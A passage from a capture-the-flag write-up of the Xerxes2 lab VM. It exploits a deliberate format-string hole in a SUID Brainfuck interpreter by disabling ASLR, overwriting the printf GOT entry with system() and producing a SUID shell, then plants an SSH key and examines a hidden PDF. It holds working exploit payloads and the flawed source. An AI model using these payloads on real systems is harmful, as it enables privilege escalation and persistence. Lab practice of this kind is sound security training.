{</p>

<pre><code>int programcounter = 0;
int datapointer = 0;

while (program[programcounter])
{
    switch(program[programcounter])
    {
        case '.':
            printf("%c", buf[datapointer]);
            break;
        case ',':
            buf[datapointer] = getchar();
            break;
        case '&gt;':
            datapointer = (datapointer == (BUF_SIZE-1)) ? 0 : ++datapointer;
            break;
        case '&lt;':
            datapointer = (datapointer == 0) ? (BUF_SIZE-1) : --datapointer;
            break;
        case '+':
            buf[datapointer]++;
            break;
        case '-':
            buf[datapointer]--;
            break;
        case '[':
            if (buf[datapointer] == 0)
            {
                int indent = 1;
                while (indent)
                {
                    programcounter++;

                    if (program[programcounter] == ']')
                    {
                        indent--;
                    }
                    if (program[programcounter] == '[')
                    {
                        indent++;
                    }
                }
            }
            break;
        case ']':
            if (buf[datapointer])
            {
                int indent = 1;
                while (indent)
                {
                    programcounter--;

                    if (program[programcounter] == ']')
                    {
                        indent++;
                    }
                    if (program[programcounter] == '[')
                    {
                        indent--;
                    }
                }
            }
            break;
        case '#':
            // new feature
            printf(buf);
            break;
    }
    programcounter++;
}
</code></pre>

<p>}</p>

<p>int main(int argc, char **argv)
{
    char buf[BUF_SIZE];</p>

<pre><code>if (argc &lt; 2)
{
        printf("usage: %s [program]\n", argv[0]);
        exit(-1);
}

memset(buf, 0, sizeof(buf));
bf(argv[1], buf);

exit(0);
</code></pre>

<p>}</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>It looks like some kind of interpreter - what language uses +-&lt;&gt;,. and <span class="c"># ? Well, I know for a fact that [Brainfuck](http://en.wikipedia.org/wiki/Brainfuck) uses all but #, and the source code says that # is a new function. Maybe this is a Brainfuck interpreter (please don&#39;t let it be Brainfuck). It looks like a compiled version of this code is available in /opt, so lets pass it a Hello World program to see if our assumption is true.</span>
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>delacroix@xerxes2:~$ /opt/bf &ldquo;++++++++[>++++[>++>+++>+++>+&lt;&lt;&lt;&lt;-]>+>+>->>+[&lt;]&lt;-]>>.>&mdash;.+++++++..+++.>>.&lt;-.&lt;.+++.&mdash;&mdash;.&mdash;&mdash;&ndash;.>>+.>++.&rdquo;
Hello World!
delacroix@xerxes2:~$</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Yup, it<span class="s1">&#39;s Brainfuck. Shit.</span>
</span><span class='line'>
</span><span class='line'><span class="s1">![](http://files.abovetopsecret.com/files/img/gm5273ef16.gif)</span>
</span><span class='line'>
</span><span class='line'><span class="s1">However, it is owned by the polito user, and has SUID set.</span>
</span><span class='line'>
</span><span class='line'><span class="s1">The source code for the newly added # command indicates that it will be susceptible to a formatstring vulnerability - you can read about my forays in formatstr in my Hell writeup, but this one took a LOT longer. After I prodded around for a bit, I decided that I would overwrite the printf() pointer in the global offset table with the memory address of system() by calling # with a formatstring buffer, then call the newly redirected # command with a buffer of /bin/sh. This should technically run /bin/sh for me.</span>
</span><span class='line'>
</span><span class='line'><span class="s1">So, lets start basic. Here&#39;</span>s my process of trying to find things in the stack.
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>delacroix@xerxes2:~$ echo &lsquo;AAAA%17$x&rsquo; | /opt/bf &lsquo;,>,>,>,>,>,>,>,>,#&rsquo;
AAAA24373125
delacroix@xerxes2:~$ echo &lsquo;AAA%17$xBBBB.%18$x&hellip;.%19$x&hellip;&rsquo; | /opt/bf &lsquo;,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,#&rsquo;
AAA78243731BBBBB.42424242&hellip;.31252e42
delacroix@xerxes2:~$ echo &lsquo;AAAA%16$x&rsquo; | /opt/bf &lsquo;,>,>,>,>,>,>,>,>,#&rsquo;
AAAA41414141</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>OK, so I can put things into the buffer and find them in the stack. However, there<span class="s1">&#39;s a gotcha - ASLR is enabled on this box - we need to circumvent that. Could I write an application that has ASLR disabled, and run that, then use the system location from that and call it ? Probably... what about gdb, I know that [disables ASLR](http://www.outflux.net/blog/archives/2010/07/03/gdb-turns-off-aslr/), but it also disables SUID, so that&#39;</span>s out. Google to the rescue ! The <span class="o">[</span>following site<span class="o">](</span>http://security.cs.pub.ro/hexcellents/wiki/kb/exploiting/home<span class="o">)</span> helpfully tells me that <span class="nb">ulimit</span> -s unlimited disables ASLR on 32bit systems, so that<span class="err">&#39;</span>s my golden ticket.
</span><span class='line'>
</span><span class='line'>So, with ASLR temporarily disabled, I can find the location <span class="k">for</span> the <span class="nb">printf </span>got pointer using objdump.
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>delacroix@xerxes2:~$ ulimit -s unlimited
delacroix@xerxes2:~$ objdump -R /opt/bf</p>

<p>/opt/bf:     file format elf32-i386</p>

<p>DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049a38 R_386_GLOB_DAT    <strong>gmon_start</strong>
08049a48 R_386_JUMP_SLOT   printf
08049a4c R_386_JUMP_SLOT   getchar
08049a50 R_386_JUMP_SLOT   <strong>gmon_start</strong>
08049a54 R_386_JUMP_SLOT   exit
08049a58 R_386_JUMP_SLOT   __libc_start_main
08049a5c R_386_JUMP_SLOT   memset
08049a60 R_386_JUMP_SLOT   putchar</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">printf </span>is at 08049a48. Now I have to find system<span class="o">()</span>. gdb can <span class="nb">help </span>with that.
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>delacroix@xerxes2:~$ gdb /opt/bf
GNU gdb (GDB) 7.4.1-debian
Copyright &copy; 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <a href="http://gnu.org/licenses/gpl.html">http://gnu.org/licenses/gpl.html</a>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type &ldquo;show copying&rdquo;
and &ldquo;show warranty&rdquo; for details.
This GDB was configured as &ldquo;i486-linux-gnu&rdquo;.
For bug reporting instructions, please see:
<a href="http://www.gnu.org/software/gdb/bugs/">http://www.gnu.org/software/gdb/bugs/</a>&hellip;
Reading symbols from /opt/bf&hellip;(no debugging symbols found)&hellip;done.
(gdb) break main
Breakpoint 1 at 0x8048687
(gdb) run
Starting program: /opt/bf</p>

<p>Breakpoint 1, 0x08048687 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0x40062000 <system>
(gdb) p printf
$2 = {<text variable, no debug info>} 0x4006ff50 <printf></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>I need to overwrite 0x08049a48 with 0x40062000 - that shouldn<span class="err">&#39;</span>t be too hard. I really only need to change the last <span class="m">2</span> bytes from ff50 to 2000, which means I can <span class="k">do</span> this with just one write. After lots of debugging I ended up at the following
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>echo $(python -c &ldquo;print &lsquo;\x48\x9a\x04\x08&rsquo;&rdquo;)%8186u%16\$hn | /opt/bf &lsquo;,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,##&rsquo;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>I have many conversations with people on IRC, where I like to think aloud with people I talk to on a regular basis. c0ne helped me with the formatstr on Hell, so it was natural I<span class="err">&#39;</span>d talk to him
</span></code></pre></td></tr></table></div></figure>


<p> bash
[23:16:17]  <recrudesce>    delacroix@xerxes2:~$ echo &ldquo;ABCD&rdquo; | ./b &ldquo;,>#&rdquo;
[23:16:19]  <recrudesce>    returns A
[23:16:24]  <recrudesce>    echo &ldquo;ABCD&rdquo; | ./b &ldquo;,>&lt;,>#&rdquo; returns B
[23:16:30]  <recrudesce>    echo &ldquo;ABCD&rdquo; | ./b &ldquo;,>&lt;,>&lt;,#&rdquo; = C
[23:16:36]  <recrudesce>    echo &ldquo;ABCD&rdquo; | ./b &ldquo;,>&lt;,>&lt;,>&lt;,#&rdquo; = D
[23:16:38]  <recrudesce>    so&hellip;
[23:16:41]  <c0ne>  i get
[23:16:49]  <c0ne>  so it needs placeholder to print to
[23:16:56]  <c0ne>  placeholders
[23:17:06]  <c0ne>  ,>&lt;,>&lt;,>&lt;,
[23:17:13]  <c0ne>  not sure how it works
[23:18:09]  <recrudesce>    echo &ldquo;ABCDE&rdquo; | ./b &ldquo;,>,>,>,#&lt;,&lt;&lt;&lt;,>#&rdquo;
[23:18:13]  <recrudesce>    ABCDABED
[23:18:55]  <recrudesce>    echo &ldquo;ABCDWXYZ&rdquo; | ./b &ldquo;,>,>,>,#&lt;&lt;&lt;,>,>,>,#&rdquo;
[23:19:18]  <recrudesce>    ook, so that reads ABCD into the buffer, then prints it, goes back to the start of the buffer, and reads the next 4 characters, WXYZ
[23:19:20]  <recrudesce>    then prints that
[23:19:37]  <recrudesce>    so, all we need to do is go back to a few pointers, and re-read some further data in
[23:20:08]  <c0ne>  Oo
[23:20:11]  <recrudesce>    so, we need to make sure that the correct amount of ,> are before our first #
[23:20:18]  <recrudesce>    else we accidently read /bin/bash too</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Many many failures were experienced at this point - and I<span class="s1">&#39;m talking at least 3 hours of failed executions or failed memory overwrites.  I managed to get basic command execution, but only once every 5-10 attempts would be successful due to the stack shifting ever so slightly.  Anyway, who wants to listen to my boohoo story - you came here for the answers, so here&#39;</span>s what you have to <span class="k">do</span>. Make a shell script in /tmp containing the following
</span><span class='line'>
</span><span class='line'><span class="o">[</span>bash<span class="o">]</span>
</span><span class='line'><span class="c">#!/bin/sh</span>
</span><span class='line'>cp /bin/sh /tmp/shell
</span><span class='line'>chmod <span class="m">4777</span> /tmp/shell<span class="o">[</span>/bash<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>chmod +x the file so it is executable, and <span class="k">then</span> run the following
</span></code></pre></td></tr></table></div></figure>


<p> bash
delacroix@xerxes2:~$ echo $(python -c &ldquo;print &lsquo;\x48\x9a\x04\x08&rsquo; + &lsquo;%8186u%16\$hn;\/tmp\/123.sh\x00&rsquo;&rdquo;) | /opt/bf &lsquo;,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,#&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;,>,>,>,>,>,>,>,>,>,>,>,>,>,>,#&rsquo;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>It will probably throw an error, but the shell script will run and you<span class="err">&#39;</span>ll end up with a copy of /bin/sh in /tmp, with the SUID bit <span class="nb">set</span>, which when run will elevate you to the polito user.
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>1075339252delacroix@xerxes2:~$ ls -l /tmp
total 148
-rw-r&ndash;r&ndash; 1 delacroix delacroix    53 Aug  6 12:07 file1
-rw-r&ndash;r&ndash; 1 delacroix delacroix    61 Aug  6 13:03 file2
-rw-r&ndash;r&ndash; 1 delacroix delacroix    49 Aug  6 12:24 file3
-rw-r&ndash;r&ndash; 1 delacroix delacroix    49 Aug  6 12:27 file4
-rw-r&ndash;r&ndash; 1 delacroix delacroix     5 Aug  6 12:31 file5
-rw-r&ndash;r&ndash; 1 delacroix delacroix   253 Aug  6 12:50 file6
-rw-r&ndash;r&ndash; 1 delacroix delacroix    73 Aug  6 13:37 file7
-rw-r&ndash;r&ndash; 1 delacroix delacroix    49 Aug  6 13:59 file8
-rw-r&ndash;r&ndash; 1 delacroix delacroix    44 Aug  6 13:59 file9
-rw-r&ndash;r&ndash; 1 delacroix delacroix    11 Aug  6 14:15 filea
-rw-r&ndash;r&ndash; 1 delacroix delacroix    11 Aug  6 14:13 fileb
-rw-r&ndash;r&ndash; 1 delacroix delacroix    11 Aug  6 14:13 filec
-rwxr-xr-x 1 delacroix delacroix    55 Aug  6 16:15 gah.sh
-rwsrwxrwx 1 polito    polito    97284 Aug  6 16:15 shell
delacroix@xerxes2:~$ /tmp/shell
$ id
uid=1002(delacroix) gid=1002(delacroix) euid=1001(polito) groups=1001(polito),1002(delacroix)
$</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>I <span class="k">then</span> did the same deal here - <span class="nb">echo</span><span class="s1">&#39;d my SSH public key to ~/.ssh/authorized_keys and SSH&#39;</span>d in as polito.
</span><span class='line'>
</span><span class='line'>As a side note, I spoke to barrebas on IRC about my exploit route and he was able to refine it further
</span></code></pre></td></tr></table></div></figure>


<p> bash
[00:15:55]  <barrebas>  sweet your exploit is much smaller than mine, nice!
[00:16:01]  <recrudesce>    really ???
[00:16:19]  <barrebas>  yeah, i didn&rsquo;t use direct parameter addressing
[00:16:33]  <barrebas>  and i wrote 4 bytes instead of 2, yours is smarter
[00:16:54]  <recrudesce>    that&rsquo;s taken me hours
[00:25:48]  <barrebas>  a bit shorter still:
[00:25:50]  <barrebas>  python -c &ldquo;print &lsquo;\x48\x9a\x04\x08&rsquo; + &lsquo;;\/tmp\/123.sh;%8173u%16\$hn&rsquo;&rdquo; | /opt/bf &lsquo;,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,##&rsquo;
[00:26:08]  <recrudesce>    you know what, that looks like another one i did, but only slightly
[00:26:36]  <barrebas>  anyway, nice work</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>!<span class="o">[](</span>http://www.playandroid.com/wp-content/uploads/2012/04/U-Mad-Bro.jpg<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>* * *
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c">## Wandering the Operations Deck with Janice</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>!<span class="o">[](</span>http://img3.wikia.nocookie.net/__cb20111214193431/shodan/images/2/22/Janice_Polito_%28portrait%29.png<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Say hello to <span class="o">[</span>Janice Polito<span class="o">](</span>http://shodan.wikia.com/wiki/Janice_Polito<span class="o">)</span>, she<span class="s1">&#39;s got a smirk on her hasn&#39;</span>t she ?
</span></code></pre></td></tr></table></div></figure>


<p> bash
root@pwk:~# ssh <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#58;&#112;&#x6f;&#x6c;&#105;&#x74;&#111;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#x2e;&#x30;&#x2e;&#49;&#x30;&#x32;">&#112;&#x6f;&#108;&#105;&#x74;&#111;&#64;&#49;&#x39;&#50;&#46;&#49;&#x36;&#x38;&#46;&#48;&#x2e;&#49;&#48;&#x32;</a></p>

<p>Welcome to xerxes2.
      XERXES wishes you
       a pleasant stay.</p>

<hr />

<p><code>MM(   )P' 6MMMMb</code>MM 6MM <code>MM(   )P' 6MMMMb   6MMMMb\  6MMMMb
</code>MM<code>,P  6M' </code>Mb MM69 &ldquo;  <code>MM</code> ,P  6M&#8217;  <code>Mb MM'   </code> MM&#8217;  <code>Mb
 </code>MM,P   MM    MM MM&#8217;      <code>MM,P   MM    MM YM.           ,MM
  </code>MM.   MMMMMMMM MM        <code>MM.   MMMMMMMM  YMMMMb      ,MM'
   d</code>MM.  MM       MM        d<code>MM.  MM           </code>Mb   ,M&#8217;
  d&#8217; <code>MM. YM    d9 MM       d'</code>MM. YM    d9 L    ,MM ,M&#8217;
<em>d</em>  <em>)MM</em> YMMMM9 <em>MM</em>    <em>d</em>  <em>)MM</em> YMMMM9  MYMMMM9  MMMMMMMM</p>

<p>polito@xerxes2:~$ id
uid=1001(polito) gid=1001(polito) groups=1001(polito)
polito@xerxes2:~$ ls -l
total 172960
-rw-r&ndash;r&ndash; 1 polito polito    142564 Jul 16 10:57 audio.txt
-rw-r&ndash;r&ndash; 1 polito polito  44813850 Jul 16 12:17 dump.gpg
-rw-r&ndash;r&ndash; 1 polito polito     27591 Jul 16 12:19 polito.pdf</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>OK, so in /home/polito we have a PDF, a PGP<span class="err">&#39;</span>d file and an audio.txt file.  This audio.txt is being served by nc on port <span class="m">4444</span> - surprise !
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>polito@xerxes2:~$ ps aux | grep 4444
polito    2175  0.0  0.1   1936   568 ?        Ss   Aug06   0:00 /bin/sh -c while true ; do nc -l -p 4444 &lt; /home/polito/audio.txt ; done
polito   19481  0.0  0.1   1904   640 ?        S    08:56   0:00 nc -l -p 4444</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Sit comfortably, children, <span class="k">for</span> I have a story to tell about this PDF. I transferred it to my laptop, and opened it... a blank PDF. I decided there must be something hidden in the file. Now, I must admit my PDF forensics skills are somewhat lacking. However, people like Didier Stevens make life a little easier with their little Python tools such as <span class="o">[</span>pdf-parser<span class="o">](</span>http://blog.didierstevens.com/programs/pdf-tools/<span class="o">)</span>.
</span><span class='line'>
</span><span class='line'>I used pdf-parser to see what the PDF contained
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>root@pwk:~# pdf-parser polito.pdf
PDF Comment &lsquo;%PDF-1.5\n&rsquo;</p>

<p>obj 999 0
 Type:
 Referencing:
 Contains stream</p>

<p>  &lt;&lt;</p>

<blockquote><blockquote></blockquote></blockquote>

<p>obj 3 0
 Type: /Page
 Referencing: 4 0 R, 2 0 R, 7 0 R</p>

<p>  &lt;&lt;
    /Type /Page
    /Contents 4 0 R
    /Resources 2 0 R
    /MediaBox [0 0 595.276 841.89]
    /Parent 7 0 R</p>

<blockquote><blockquote></blockquote></blockquote>

<p>obj 1 0
 Type: /XObject
 Referencing: 8 0 R
 Contains stream</p>

<p>  &lt;&lt;
    /Type /XObject
    /Subtype /Image
    /Width 200
    /Height 200
    /BitsPerComponent 1
    /ColorSpace [/Indexed /DeviceRGB 1 8 0 R]
    /Length 301
    /Filter /FlateDecode</p>

<blockquote><blockquote></blockquote></blockquote>

<p>obj 8 0
 Type:
 Referencing:
 Contains stream</p>

<p>  &lt;&lt;
    /Length 14
    /Filter /FlateDecode</p>

<blockquote><blockquote></blockquote></blockquote>

<p>obj 2 0
 Type:
 Referencing: 5 0 R, 6 0 R, 1 0 R</p>

<p>  &lt;&lt;
    /Font
      &lt;&lt;
        /F15 5 0 R
        /F8 6 0 R
      >>
    /XObject
      &lt;&lt;
        /Im1 1 0 R
      >>
    /ProcSet [ /PDF /Text /ImageC /ImageI ]</p>

<blockquote><blockquote></blockquote></blockquote>

<p>obj 9 0
 Type:
 Referencing:</p>

<p>obj 10 0
 Type:
 Referencing:</p>

<p>obj 11 0
 Type:
 Referencing:
 Contains stream</p>

<p>  &lt;&lt;
    /Length1 1462
    /Length2 9126
    /Length3 0
    /Length 10107
    /Filter /FlateDecode</p>

<blockquote><blockquote></blockquote></blockquote>

<p>obj 12 0
 Type: /FontDescriptor
 Referencing: 11 0 R</p>

<p>  &lt;&lt;
    /Type /FontDescriptor
    /FontName /WEGFEK+CMR10
    /Flags 4
    /FontBBox [-40 -250 1009 750]
    /Ascent 694
    /CapHeight 683
    /Descent -194
    /ItalicAngle 0
    /StemV 69
    /XHeight 431
    /CharSet (
    /R /b
    /comma /e
    /m /r)
    /FontFile 11 0 R</p>

<blockquote><blockquote></blockquote></blockquote>

<p>obj 13 0
 Type:
 Referencing:
 Contains stream</p>

<p>  &lt;&lt;
    /Length1 1858
    /Length2 11943
    /Length3 0
    /Length 13097
    /Filter /FlateDecode</p>

<blockquote><blockquote></blockquote></blockquote>

<p>obj 14 0
 Type: /FontDescriptor
 Referencing: 13 0 R</p>

<p>  &lt;&lt;
    /Type /FontDescriptor
    /FontName /ZTMOYO+CMTT10
    /Flags 4
    /FontBBox [-4 -233 537 696]
    /Ascent 611
    /CapHeight 611
    /Descent -222
    /ItalicAngle 0
    /StemV 69
    /XHeight 431
    /CharSet (
    /F /H
    /I /Y
    /a /b
    /c /comma
    /d /e
    /f /g
    /h /i
    /k /l
    /m /n
    /o /p
    /period /question
    /quoteright /r
    /s /slash
    /t /u
    /v /w
    /y )
    /FontFile 13 0 R</p>

<blockquote><blockquote></blockquote></blockquote>

<p>obj 6 0
 Type: /Font
 Referencing: 12 0 R, 9 0 R</p>

<p>  &lt;&lt;
    /Type /Font
    /Subtype /Type1
    /BaseFont /WEGFEK+CMR10
    /FontDescriptor 12 0 R
    /FirstChar 44
    /LastChar 114
    /Widths 9 0 R</p>

<blockquote><blockquote></blockquote></blockquote>

<p>obj 5 0
 Type: /Font
 Referencing: 14 0 R, 10 0 R</p>

<p>  &lt;&lt;
    /Type /Font
    /Subtype /Type1
    /BaseFont /ZTMOYO+CMTT10
    /FontDescriptor 14 0 R
    /FirstChar 39
    /LastChar 121
    /Widths 10 0 R</p>

<blockquote><blockquote></blockquote></blockquote>

<p>obj 7 0
 Type: /Pages
 Referencing: 3 0 R</p>

<p>  &lt;&lt;
    /Type /Pages
    /Count 1
    /Kids [3 0 R]</p>

<blockquote><blockquote></blockquote></blockquote>

<p>obj 15 0
 Type: /Catalog
 Referencing: 7 0 R</p>

<p>  &lt;&lt;
    /Type /Catalog
    /Pages 7 0 R</p>

<blockquote><blockquote></blockquote></blockquote>

<p>obj 16 0
 Type:
 Referencing:</p>

<p>  &lt;&lt;
    /Producer (pdfTeX-1.40.13)
    /Creator (TeX)
    /CreationDate &ldquo;(D:20140605220405+02&#8217;00&#8217;)&rdquo;
    /ModDate &ldquo;(D:20140605220405+02&#8217;00&#8217;)&rdquo;
    /Trapped /False
    /PTEX.Fullbanner (This is pdfTeX, Version 3.1415926-2.4-1.40.13 (TeX Live 2012
    /Debian ) kpathsea version 6.1.0)</p>

<blockquote><blockquote></blockquote></blockquote>

<p>xref</p>

<p>trailer
  &lt;&lt;
    /Size 17
    /Root 150R
    /Info 160R
    /ID [<F11EC07203BA4D86560A32F64766D9D3><F11EC07203BA4D86560A32F64766D9D3>]</p>

<blockquote><blockquote></blockquote></blockquote>

<p>startxref 26582</p>

<p>PDF Comment &lsquo;%%EOF\n&rsquo;</p>

<p>root@pwk:~#</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>So, a couple of objects, <span class="m">2</span> fonts and an image. The ID<span class="err">&#39;</span>s of interest are 999, 1, and 8. pdf-parser can be used to extract objects, so I extracted them all. <span class="m">1</span> and <span class="m">4</span> resulted in nothing interesting, <span class="m">8</span> resulted in a text file that <span class="nb">read</span> <span class="s2">&quot;foo&quot;</span>, but <span class="m">999</span> extracted as a file that looked like a PDF without headers.
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>root@pwk:~# cat pdf999_b
h?h??!Y??MZt
            ??????????U?u???????r?&ndash;WARNING&ndash;
   Unauthorized file access will be reported.
     XERXES wishes you
          a most productive dayhowhYXh
h7ihhzhOwh45h
@hgIh ,h#ohMZh</p>

<p>hNlhaWhFuhamh
 h: hishd horhswhash phheh
T??U?%PDF-1.5
%????
4 0 obj &lt;&lt;
/Length 292     <br/>
/Filter /FlateDecode</p>

<blockquote><blockquote><p>stream
x?mQ?n?0
        ??+|+H#%I   ?4?ڪu?M\?i
??? ??
      ????????Y?>E?? ?  ??p,(?cJ??{e??&ldquo;y????0MgqY<em>?#(s??M&amp;e6??8?zm?A??????? M??q?&ndash;I?y?uZ^?Z???$?l??*c-tj?????v3ߴ~S?2>[5ZT9???g??M?aU</em>?????䟲??VY??=?n?S?h?r?H?s&amp;`F?ry??ǆ??B/h?????mt?&#8220;?c?V?W??Ƨ?;??|?~ގ1??s5 ?????-9?0
root@pwk:~#</p></blockquote></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>I used a hexeditor to add the PDF header and footer information
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>00000000   83 E0 FF EB  1F 25 50 44  46 2D 31 2E  35 0A 68 E0  08 17 BC 00  10 68 C0 07  &hellip;..%PDF-1.5.h&hellip;&hellip;h..
00000018   1F EB 21 59  81 F9 4D 5A  74 0C B4 0E  86 C1 CD 10  86 C5 CD 10  EB ED BE 55  ..!Y..MZt&hellip;&hellip;&hellip;&hellip;..U
00000030   00 AC 75 02  EB FE B4 0E  CD 10 EB F5  EB 72 E9 2D  2D 57 41 52  4E 49 4E 47  ..u&hellip;&hellip;&hellip;.r.&ndash;WARNING
00000048   2D 2D 0A 20  20 20 55 6E  61 75 74 68  6F 72 69 7A  65 64 20 66  69 6C 65 20  &ndash;.   Unauthorized file
00000060   61 63 63 65  73 73 20 77  69 6C 6C 20  62 65 20 72  65 70 6F 72  74 65 64 2E  access will be reported.
00000078   0A 20 20 20  20 20 58 45  52 58 45 53  20 77 69 73  68 65 73 20  79 6F 75 0A  .     XERXES wishes you.
00000090   20 20 20 20  20 20 20 20  20 20 61 20  6D 6F 73 74  20 70 72 6F  64 75 63 74            a most product
000000A8   69 76 65 20  64 61 79 00  68 6F 77 68  59 58 68 0D  0A 68 37 69  68 68 7A 68  ive day.howhYXh..h7ihhzh
000000C0   4F 77 68 34  35 68 0A 40  68 67 49 68  20 2C 68 23  6F 68 4D 5A  68 0A 0A 68  Owh45h.@hgIh ,h#ohMZh..h
000000D8   4E 6C 68 61  57 68 46 75  68 61 6D 68  0A 20 68 3A  20 68 69 73  68 64 20 68  NlhaWhFuhamh. h: hishd h
000000F0   6F 72 68 73  77 68 61 73  68 20 70 68  68 65 68 0A  54 E9 17 FF  00 00 00 00  orhswhash phheh.T&hellip;&hellip;.
00000108   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;
00000120   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;
00000138   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;
00000150   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;
00000168   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;
00000180   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;
00000198   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;
